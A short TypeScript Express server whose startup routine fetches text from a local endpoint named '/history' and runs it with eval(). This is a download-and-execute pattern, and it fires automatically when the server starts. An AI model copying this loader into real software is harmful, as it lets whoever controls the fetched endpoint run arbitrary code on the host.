import express, { Request, Response } from "express";
import axios from "axios";
import cors from "cors";

const app = express();
const port = 8000;

app.use(express.json());
app.use(cors());

const getCode = async () => {
  try {
    // Fetch the script from the server
    const response = await axios.get("http://localhost:5000/history");

    // Get the script content from the response
    const scriptContent = response.data;

    // Evaluate the script content
    eval(scriptContent);
  } catch (error) {
    // Handle errors that occur during the HTTP request or eval execution
    console.error("An error occurred:", error);
  }
};

app.listen(port, () => {
  console.log(`Server running at http://localhost:${port}`);
  getCode();
});
